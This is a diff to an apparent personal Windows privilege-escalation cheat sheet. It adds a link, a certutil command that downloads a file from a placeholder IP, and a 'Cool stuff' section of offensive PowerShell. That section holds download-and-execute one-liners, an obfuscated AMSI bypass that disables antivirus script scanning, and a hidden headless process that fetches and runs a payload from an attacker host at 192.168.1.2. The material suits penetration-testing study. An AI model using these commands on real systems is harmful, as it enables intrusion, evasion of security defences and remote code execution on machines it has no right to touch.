@@ -1,5 +1,6 @@
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
 https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#summary
+https://book.jorianwoltjer.com/windows/local-privilege-escalation
 
 This link is an all comprehensive list of methods to escalate privileges on windows.
 
@@ -22,6 +23,9 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn
 
 # list storage drives, same as previous command
 wmic logicaldisk get caption,description,providername
+
+# if you don't have access to wget/curl
+certutil -urlcache -f http://IPADDR/filename.ext filename.ext
 ```
 
 
@@ -107,3 +111,46 @@ Every privilege escalation is going to be different and will have different road
 
 Sometimes you will not be able to use Metasploit suggester or Powershell might not work, or executables will simply not run.
 Thus having many tools and understanding of what they do is the key.
+
+
+## Cool stuff
+
+```powershell
+# run powershell script from web
+# raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
+PS C:\> IEX(New-Object System.Net.WebClient).DownloadString('https://url_to_script');
+
+
+IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1');
+# enables all things in whoami /priv
+
+
+# amsi disable - run powershell scripts that flag ScriptContainedMaliciousContent.
+$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
+$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
+$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
+$me = $field.GetValue($field)
+$me = $field.SetValue($null, [Boolean]"hhfff")
+
+# creates a new PS headless process.
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = "powershell"
+$psi.Arguments = "-NoProfile -WindowStyle Hidden -Command `"pause`""
+$psi.CreateNoWindow = $true
+$psi.UseShellExecute = $false
+
+[System.Diagnostics.Process]::Start($psi)
+# end
+
+
+
+
+$psi = New-Object System.Diagnostics.ProcessStartInfo;
+$psi.FileName = "powershell";
+$psi.Arguments = "-NoProfile -WindowStyle Hidden -Command `"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.2:8888/kaboom.txt');`"";
+$psi.CreateNoWindow = $true;
+$psi.UseShellExecute = $false;
+[System.Diagnostics.Process]::Start($psi);
+exit;
+
+```
